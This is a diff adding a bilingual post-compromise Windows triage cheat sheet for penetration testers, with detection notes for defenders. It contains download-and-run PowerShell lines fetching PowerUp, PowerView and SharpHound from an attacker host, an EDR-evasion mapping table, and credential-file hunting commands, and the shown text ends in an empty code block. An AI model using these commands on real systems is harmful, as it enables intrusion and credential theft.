@@ -1,0 +1,708 @@
+<!doctype html>
+<!-- ============================================================
+     新しいチートシートを作るときはこのファイルを複製して編集する。
+     置換箇所: <TITLE> / <SLUG> / <目次> / <本文>
+     ============================================================ -->
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Situational Awareness — d0me</title>
+<meta name="description" content="Post-compromise host triage — identity, defense detection, privesc paths, network position, credential hunt, and next-action decision matrix.">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Situational Awareness</div>
+    <h1>Situational Awareness</h1>
+    <p class="lede">A checklist for triaging a Windows host immediately after foothold — identity, defenses, privesc paths, network position, credentials.<span class="jp">侵入直後の Windows ホストで即実行する状況把握チェックリスト。権限・防御・昇格経路・ネットワーク位置・認証情報を段階的に確認する。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#s01">01 Identity &amp; Privileges</a></li>
+      <li><a href="#s02">02 Host Fingerprint</a></li>
+      <li><a href="#s03">03 Defense Detection</a></li>
+      <li><a href="#s04">04 Privilege Escalation Paths</a></li>
+      <li><a href="#s05">05 Network Position</a></li>
+      <li><a href="#s06">06 Domain Enumeration (from Host)</a></li>
+      <li><a href="#s07">07 Credential &amp; File Hunt</a></li>
+      <li><a href="#s08">08 Decision Matrix</a></li>
+      <li><a href="#s09">09 Order &amp; Key Takeaways</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Identity &amp; Privileges<span class="jp">権限・整合性確認</span></h2>
+      <p>foothold 直後 30 秒以内に完了させる。ここの出力が Section 04 以降の分岐条件を全て決める。</p>
+
+      <h3>Current user / groups / privileges</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>whoami
+whoami /all
+whoami /priv
+whoami /groups</code></pre></div>
+
+      <h3>判断ポイント</h3>
+      <table>
+        <thead><tr><th>出力</th><th>意味</th><th>次アクション</th></tr></thead>
+        <tbody>
+          <tr><td><code>nt authority\system</code></td><td>既に SYSTEM</td><td>Section 04 スキップ可</td></tr>
+          <tr><td><code>High Mandatory Level</code> (S-1-16-12288)</td><td>High Integrity</td><td>UAC bypass 不要</td></tr>
+          <tr><td><code>Medium Mandatory Level</code> (S-1-16-8192)</td><td>Medium</td><td>UAC bypass 要 (<a href="evasion.html#s05">evasion 05</a>)</td></tr>
+          <tr><td><code>SeImpersonatePrivilege</code></td><td>サービスアカウント</td><td>Potato 系で SYSTEM (<a href="evasion.html#s08">evasion 08</a>)</td></tr>
+          <tr><td><code>SeBackupPrivilege</code></td><td>hive 取得可</td><td>SAM / SYSTEM dump</td></tr>
+          <tr><td><code>SeRestorePrivilege</code></td><td>任意ファイル書込</td><td>サービスバイナリ置換</td></tr>
+          <tr><td><code>SeDebugPrivilege</code></td><td>プロセスメモリ read</td><td>LSASS dump 直接可</td></tr>
+          <tr><td><code>SeLoadDriverPrivilege</code></td><td>ドライバロード可</td><td>PPL bypass (<a href="evasion.html#s07">evasion 07</a>)</td></tr>
+          <tr><td><code>S-1-5-32-544</code></td><td>Administrators</td><td>Defender 無効化可</td></tr>
+          <tr><td><code>S-1-5-32-580</code></td><td>Remote Management Users</td><td>WinRM 接続経路</td></tr>
+        </tbody>
+      </table>
+
+      <h3>PowerShell execution context</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+Get-ExecutionPolicy -List</code></pre></div>
+
+      <table>
+        <thead><tr><th>LanguageMode</th><th>制約</th><th>対応</th></tr></thead>
+        <tbody>
+          <tr><td>FullLanguage</td><td>なし</td><td>通常運用</td></tr>
+          <tr><td>ConstrainedLanguage</td><td>.NET 直接呼出不可、Add-Type 不可</td><td>CLM bypass (<a href="evasion.html#s03">evasion 03</a>)</td></tr>
+          <tr><td>RestrictedLanguage</td><td>既定 cmdlet のみ</td><td>同上</td></tr>
+          <tr><td>NoLanguage</td><td>スクリプト不可</td><td>別シェル取得</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>Host Fingerprint<span class="jp">OS・アーキ・パッチ</span></h2>
+
+      <h3>OS / architecture</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
+echo %PROCESSOR_ARCHITECTURE%
+echo %PROCESSOR_ARCHITEW6432%
+wmic os get Caption,Version,BuildNumber,OSArchitecture</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>[System.Environment]::OSVersion
+[System.Environment]::Is64BitOperatingSystem
+[System.Environment]::Is64BitProcess
+[IntPtr]::Size    <span class="c"># 8 = 64bit, 4 = 32bit</span></code></pre></div>
+
+      <h3>OS build → 主要 KB 対応</h3>
+      <table>
+        <thead><tr><th>Build</th><th>Version</th><th>主要 KB / CVE</th></tr></thead>
+        <tbody>
+          <tr><td>7600 / 7601</td><td>Win 7 / 2008 R2</td><td>MS17-010 EternalBlue</td></tr>
+          <tr><td>9200</td><td>Win 8 / 2012</td><td>MS14-068, MS16-032</td></tr>
+          <tr><td>9600</td><td>Win 8.1 / 2012 R2</td><td>KB3000850</td></tr>
+          <tr><td>10240–19045</td><td>Win 10</td><td>PrintNightmare (KB5005565)</td></tr>
+          <tr><td>14393</td><td>Win Server 2016</td><td>ZeroLogon (KB4577668)</td></tr>
+          <tr><td>17763</td><td>Win Server 2019</td><td>ZeroLogon</td></tr>
+          <tr><td>20348</td><td>Win Server 2022</td><td>KB5009557</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Domain 参加状態</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>hostname
+echo %USERDOMAIN%
+echo %USERDNSDOMAIN%
+echo %LOGONSERVER%
+set | findstr /i "domain logonserver userdomain"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>(Get-WmiObject Win32_ComputerSystem).PartOfDomain
+(Get-WmiObject Win32_ComputerSystem).Domain</code></pre></div>
+
+      <h3>インストール済ソフト / パッチ</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>wmic product get Name,Version,Vendor /format:csv
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s ^
+  | findstr /i "DisplayName DisplayVersion"
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s ^
+  | findstr /i "DisplayName DisplayVersion"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
+
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* `
+  | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate `
+  | Format-Table -AutoSize</code></pre></div>
+
+      <p>直近 6 ヶ月以内の KB がなければ Watson / Sherlock で対応 exploit を索引化。</p>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li><code>wmic</code> は Win 10 21H1+ で非推奨化、正規業務での使用頻度低下 → Sysmon EID 1 で親プロセスと組合せて anomaly 化</li>
+          <li>短時間 (数秒) に <code>systeminfo</code> + <code>wmic qfe</code> + <code>whoami /all</code> + <code>reg query Uninstall</code> の連鎖 → 明確な enum burst signature</li>
+          <li>PowerShell/Operational (EID 4104) の script block で <code>Get-HotFix</code> / <code>Get-WmiObject Win32_ComputerSystem</code> 呼出を可視化</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>Defense Detection<span class="jp">防御機構検出</span></h2>
+      <p>Section 04 以降のペイロード投入前に必ず完了させる。ここを飛ばすと EDR 即検知の可能性が高い。</p>
+
+      <h3>Defender 状態</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>sc query WinDefend
+sc query Sense</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, `
+  AntivirusEnabled, IsTamperProtected, BehaviorMonitorEnabled, `
+  IoavProtectionEnabled, OnAccessProtectionEnabled, NISEnabled
+
+Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, `
+  DisableScriptScanning, DisableIOAVProtection, ExclusionPath, ExclusionExtension, ExclusionProcess
+
+<span class="c"># 定義バージョン (古ければ既知サンプルが通る)</span>
+Get-MpComputerStatus | Select-Object AntivirusSignatureVersion, AntivirusSignatureLastUpdated</code></pre></div>
+
+      <h3>AMSI 状態</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># 既に bypass 済みかの確認 (True = bypass 済)</span>
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
+
+<span class="c"># amsi.dll ロード状態</span>
+Get-Process -Id $PID | ForEach-Object { $_.Modules | Where-Object { $_.ModuleName -eq "amsi.dll" } }
+
+<span class="c"># AMSI プロバイダ一覧 (Defender 以外の AV も特定)</span>
+Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -ErrorAction SilentlyContinue</code></pre></div>
+
+      <h3>EDR プロセス検出</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>tasklist /svc | findstr /i "sense carbonblack cylance crowdstrike sentinel tanium sophos trend mcafee symantec cortex elastic falcon csagent xagt fireeye"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
+Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiSpywareProduct
+Get-WmiObject -Namespace root\SecurityCenter2 -Class FirewallProduct</code></pre></div>
+
+      <h3>主要 EDR プロセス対応表</h3>
+      <table>
+        <thead><tr><th>プロセス</th><th>製品</th><th>対応 (evasion sheet 参照)</th></tr></thead>
+        <tbody>
+          <tr><td><code>MsMpEng.exe</code></td><td>Defender</td><td>Set-MpPreference / 定義削除</td></tr>
+          <tr><td><code>MsSense.exe</code></td><td>Defender for Endpoint (MDE)</td><td>Direct Syscall 必須</td></tr>
+          <tr><td><code>CSFalconService.exe</code></td><td>CrowdStrike Falcon</td><td>Direct Syscall + unhook</td></tr>
+          <tr><td><code>SentinelAgent.exe</code></td><td>SentinelOne</td><td>Direct Syscall + unhook</td></tr>
+          <tr><td><code>CylanceSvc.exe</code></td><td>Cylance</td><td>Process Hollowing</td></tr>
+          <tr><td><code>CarbonBlack.exe</code> / <code>cb.exe</code></td><td>Carbon Black</td><td>Direct Syscall</td></tr>
+          <tr><td><code>TaniumClient.exe</code></td><td>Tanium</td><td>EDR 機能弱、通常運用可</td></tr>
+          <tr><td><code>xagt.exe</code></td><td>FireEye HX</td><td>Direct Syscall</td></tr>
+        </tbody>
+      </table>
+
+      <h3>AppLocker / WDAC</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>sc query AppIDSvc
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 /s
+reg query HKLM\SYSTEM\CurrentControlSet\Control\CI\Config</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Tasks\applocker.xml</code></pre></div>
+
+      <p>LOLBAS 書込パスの疎通確認:</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>echo test &gt; C:\Windows\Tasks\test.txt   &amp;&amp; del C:\Windows\Tasks\test.txt   &amp;&amp; echo [+] Tasks writable
+echo test &gt; C:\Windows\Tracing\test.txt &amp;&amp; del C:\Windows\Tracing\test.txt &amp;&amp; echo [+] Tracing writable
+echo test &gt; C:\Windows\Temp\test.txt    &amp;&amp; del C:\Windows\Temp\test.txt    &amp;&amp; echo [+] Temp writable</code></pre></div>
+
+      <h3>ロギング / UAC / PPL</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+auditpol /get /category:*
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-Service Sysmon* -ErrorAction SilentlyContinue
+Get-Process | Where-Object { $_.Name -like "Sysmon*" }
+
+<span class="c"># PPL / Credential Guard</span>
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"    -ErrorAction SilentlyContinue
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "LsaCfgFlags" -ErrorAction SilentlyContinue</code></pre></div>
+
+      <table>
+        <thead><tr><th>RunAsPPL</th><th>LsaCfgFlags</th><th>意味</th></tr></thead>
+        <tbody>
+          <tr><td>未設定 / 0</td><td>未設定 / 0</td><td>mimikatz 通常動作可</td></tr>
+          <tr><td>1</td><td>0</td><td>LSASS 保護中 (<a href="evasion.html#s07">evasion 07</a>)</td></tr>
+          <tr><td>—</td><td>1 / 2</td><td>Credential Guard 有効、Kerberos TGT のみ取得可</td></tr>
+        </tbody>
+      </table>
+
+      <h3>一括偵察 (cmd / PowerShell)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>echo === USER === &amp;&amp; whoami /all &amp; echo. &amp; ^
+echo === OS === &amp;&amp; systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" &amp; echo. &amp; ^
+echo === DOMAIN === &amp;&amp; set USERDOMAIN &amp; set USERDNSDOMAIN &amp; set LOGONSERVER &amp; echo. &amp; ^
+echo === DEFENDER === &amp;&amp; sc query WinDefend &amp; echo. &amp; ^
+echo === EDR === &amp;&amp; tasklist /svc | findstr /i "sense carbonblack cylance crowdstrike sentinel tanium sophos cortex elastic falcon csagent xagt" &amp; echo. &amp; ^
+echo === FIREWALL === &amp;&amp; netsh advfirewall show allprofiles state &amp; echo. &amp; ^
+echo === UAC === &amp;&amp; reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA &amp; echo. &amp; ^
+echo === APPLOCKER === &amp;&amp; sc query AppIDSvc &amp; echo. &amp; ^
+echo === PATCHES === &amp;&amp; wmic qfe get HotFixID,InstalledOn /format:csv</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li><code>Get-MpComputerStatus</code> / <code>Get-MpPreference</code> の一般ユーザ実行は業務では稀 → PowerShell EID 4104 で高信頼</li>
+          <li>短時間の <code>Get-Service Sysmon*</code> + <code>tasklist /svc | findstr sense</code> の連鎖は EDR 検出試行の代表 signature</li>
+          <li>HKLM\...\ScriptBlockLogging / Transcription 読取は「攻撃者による監査回避の下調べ」の signal、Sysmon EID 12/13 で監視</li>
+          <li>AMSI プロバイダ列挙 (<code>HKLM\SOFTWARE\Microsoft\AMSI\Providers</code>) は正規業務ではほぼ発生しない</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>Privilege Escalation Paths<span class="jp">権限昇格パス探索</span></h2>
+
+      <h3>PowerUp (自動化)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>iex(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/PowerUp.ps1')
+Invoke-AllChecks</code></pre></div>
+
+      <table>
+        <thead><tr><th>検出項目</th><th>悪用</th></tr></thead>
+        <tbody>
+          <tr><td>Unquoted Service Path</td><td>スペース挟むパスに悪意バイナリ配置</td></tr>
+          <tr><td>Modifiable Service</td><td><code>sc config</code> で binpath 改ざん</td></tr>
+          <tr><td>Modifiable Service Binary</td><td>バイナリ直接置換</td></tr>
+          <tr><td>AlwaysInstallElevated</td><td><code>msiexec /quiet /qn /i payload.msi</code> で SYSTEM</td></tr>
+          <tr><td>Modifiable Registry Autorun</td><td>永続化 + 昇格</td></tr>
+        </tbody>
+      </table>
+
+      <h3>手動チェック</h3>
+      <p><strong>サービス:</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>sc query type= service state= all | findstr SERVICE_NAME
+sc qc &lt;service_name&gt;</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-WmiObject win32_service `
+  | Select-Object Name, PathName, StartName, StartMode `
+  | Format-Table -AutoSize
+
+<span class="c"># Unquoted Service Path</span>
+Get-WmiObject win32_service `
+  | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *'} `
+  | Select-Object Name, PathName</code></pre></div>
+
+      <p><strong>AlwaysInstallElevated:</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre></div>
+
+      <p>両方が <code>0x1</code> なら <code>msiexec /quiet /qn /i payload.msi</code> で SYSTEM 取得。</p>
+
+      <p><strong>スケジュールタスク:</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>schtasks /query /fo LIST /v</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-ScheduledTask `
+  | Where-Object { $_.Principal.RunLevel -eq "Highest" } `
+  | Select-Object TaskName, TaskPath, State</code></pre></div>
+
+      <h3>自動化スクリプト一括実行</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># WinPEAS (要事前転送、AV 除外推奨)</span>
+.\winPEASx64.exe quiet cmd notcolor
+
+<span class="c"># Seatbelt (.NET ベース列挙)</span>
+.\Seatbelt.exe -group=all -outputfile="C:\Windows\Tasks\seatbelt.txt"
+
+<span class="c"># PrivescCheck (PowerShell)</span>
+iex(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/PrivescCheck.ps1')
+Invoke-PrivescCheck -Extended -Report PrivescCheck</code></pre></div>
+
+      <h3>カーネル exploit 探索</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Watson (Windows Exploit Suggester)</span>
+.\Watson.exe
+
+<span class="c"># Sherlock (旧、~ Win8)</span>
+iex(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/Sherlock.ps1')
+Find-AllVulns</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>Unquoted Service Path はスキャン自体は無害だが、<code>C:\Program.exe</code> 等の書込は Sysmon EID 11 で高信頼</li>
+          <li>AlwaysInstallElevated レジストリ読取と直後の <code>msiexec /i</code> の連鎖 → SIEM 相関</li>
+          <li>WinPEAS / Seatbelt 実行の Sysmon EID 1 での親子関係 (unusual parent + 大量 read)</li>
+          <li><code>Invoke-AllChecks</code> は script block log で確実にヒット、EID 4104 パターン化</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Network Position<span class="jp">ネットワーク位置</span></h2>
+
+      <h3>NIC / ルート / ARP</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>ipconfig /all
+route print
+arp -a</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-NetIPConfiguration
+Get-NetRoute
+Get-NetNeighbor | Where-Object { $_.State -eq "Reachable" }
+Get-DnsClientCache</code></pre></div>
+
+      <h3>リスニング / 接続中ポート</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>netstat -ano
+netstat -ano | findstr LISTENING
+netstat -ano | findstr ESTABLISHED</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-NetTCPConnection -State Listen `
+  | Select-Object LocalAddress, LocalPort, OwningProcess, `
+      @{N="Process"; E={ (Get-Process -Id $_.OwningProcess).ProcessName }}</code></pre></div>
+
+      <h3>共有</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>net share
+net use
+net view \\127.0.0.1</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-SmbShare
+Get-SmbConnection
+Get-SmbMapping</code></pre></div>
+
+      <h3>プロキシ / egress 判定</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+netsh winhttp show proxy</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" `
+  | Select-Object ProxyEnable, ProxyServer, AutoConfigURL
+
+<span class="c"># egress 疎通テスト</span>
+443, 80, 8080, 53, 4444 | ForEach-Object {
+    $port = $_
+    Test-NetConnection -ComputerName &lt;LHOST&gt; -Port $port -WarningAction SilentlyContinue `
+      | Select-Object @{N="Port"; E={ $port }}, TcpTestSucceeded
+}</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li><code>net view</code> / <code>net share</code> のユーザコンテキスト実行は業務では低頻度、Sysmon EID 1 で親プロセス確認</li>
+          <li>egress 疎通テスト (複数ポートへの短時間 <code>Test-NetConnection</code>) は firewall / SIEM で「単一ホスト → 外部への複数ポート試行」として検出</li>
+          <li><code>arp -a</code> + <code>Get-NetNeighbor</code> の連鎖は横展開準備の signal</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Domain Enumeration (from Host)<span class="jp">ホストからの AD 列挙</span></h2>
+      <p>ホスト側から見える AD 情報の入口のみ。SPN / delegation / ACL の詳細列挙と攻撃は <a href="active-directory.html">active-directory sheet</a> を参照。</p>
+
+      <h3>ドメイン基本情報</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>nltest /dclist:%USERDNSDOMAIN%
+nltest /domain_trusts /all_trusts
+nltest /dsgetdc:%USERDNSDOMAIN%</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># RSAT AD モジュール利用可能な場合</span>
+Get-ADDomain
+Get-ADForest
+Get-ADDomainController -Filter *
+Get-ADTrust -Filter *</code></pre></div>
+
+      <h3>PowerView (RSAT 不要)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>iex(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/PowerView.ps1')
+
+Get-NetDomain
+Get-NetForest
+Get-NetDomainController
+Get-DomainTrust
+Get-NetUser | Select-Object samaccountname, description, memberof
+Get-NetGroup
+Get-NetGroup -GroupName "Domain Admins" | Get-NetGroupMember
+Get-NetComputer | Select-Object name, operatingsystem, operatingsystemversion</code></pre></div>
+
+      <h3>BloodHound 収集 (SharpHound)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>iex(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/SharpHound.ps1')
+Invoke-BloodHound -CollectionMethod DCOnly -Domain $env:USERDNSDOMAIN -ZipFileName C:\Windows\Tasks\bh.zip</code></pre></div>
+
+      <table>
+        <thead><tr><th>CollectionMethod</th><th>用途</th></tr></thead>
+        <tbody>
+          <tr><td><code>DCOnly</code></td><td>DC の LDAP のみ、初動推奨 (低検知)</td></tr>
+          <tr><td><code>All</code></td><td>全方位 (検知リスク中)</td></tr>
+          <tr><td><code>Session,LoggedOn</code></td><td>横展開計画用のセッション情報</td></tr>
+          <tr><td><code>LocalGroup,LocalAdmin</code></td><td>横展開先の Local Admin 把握</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Kerberos チケット</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>klist
+klist sessions</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>SharpHound <code>All</code> は DC への LDAP query 大量発火 → EID 1644 (Directory Service Field Engineering) で明確な signature</li>
+          <li><code>DCOnly</code> でも DC への非典型 LDAP パターンは Zeek / SIEM 側で検出可能</li>
+          <li><code>nltest /domain_trusts /all_trusts</code> のユーザコンテキスト実行は稀、EDR で high fidelity</li>
+          <li><code>PowerView</code> ダウンロードは Defender シグネチャ既知、web content filtering で block されうる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>Credential &amp; File Hunt<span class="jp">認証情報・機密ファイル探索</span></h2>
+
+      <h3>Windows Credential Manager / Vault</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>cmdkey /list
+vaultcmd /listcreds:"Windows Credentials" /all
+dir /a:h /s C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
+dir /a:h /s C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\</code></pre></div>
+
+      <h3>DPAPI マスターキー</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Protect\</code></pre></div>
+
+      <h3>ファイルシステム探索 (機密パターン)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$patterns = @("*pass*","*cred*","*secret*","*config*","*.kdbx","*.kdb","*.ovpn","*.rdp",
+              "*unattend*","*.bak","*backup*","sysprep*","web.config","id_rsa","id_dsa","authorized_keys")
+$paths    = @("C:\Users","C:\inetpub","C:\xampp","C:\wamp","C:\ProgramData","C:\Temp","C:\Windows\Temp")
+
+foreach ($path in $paths) {
+    foreach ($pattern in $patterns) {
+        Get-ChildItem -Path $path -Recurse -Filter $pattern -ErrorAction SilentlyContinue -Force `
+          | Select-Object FullName, Length, LastWriteTime
+    }
+}</code></pre></div>
+
+      <h3>Unattend / Sysprep (平文 password の代表箇所)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>findstr /si password C:\Windows\Panther\*.xml
+findstr /si password C:\Windows\Panther\Unattend\*.xml
+findstr /si password C:\Windows\System32\Sysprep\*.xml
+findstr /si password C:\unattend.xml</code></pre></div>
+
+      <h3>レジストリ内 credential</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
